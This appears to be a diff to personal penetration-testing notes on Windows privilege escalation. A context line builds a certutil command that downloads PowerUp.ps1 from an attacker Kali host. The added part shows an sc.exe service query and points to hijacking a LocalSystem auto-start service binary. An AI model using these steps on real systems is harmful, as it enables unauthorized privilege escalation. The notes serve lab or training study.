@@ -15,6 +15,33 @@ const command = `certutil -urlcache -split -f http://${KaliIP}/PowerUp.ps1 Power
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 ```powershell
-.\PowerUp.ps1; Invoke-AllChecks
+. .\PowerUp.ps1; Invoke-AllChecks
 ```
 
+---
+
+```
+sc.exe qc [servicename]
+```
+
+Example output
+```powershell
+sc.exe qc VeyonService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: VeyonService
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Users\Ela Arwel\Veyon\veyon-service.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Veyon Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+```
+
+Autostart means reboot system to work
+LocalSystem > Run as Root
+
+[[Hijack EXE]]
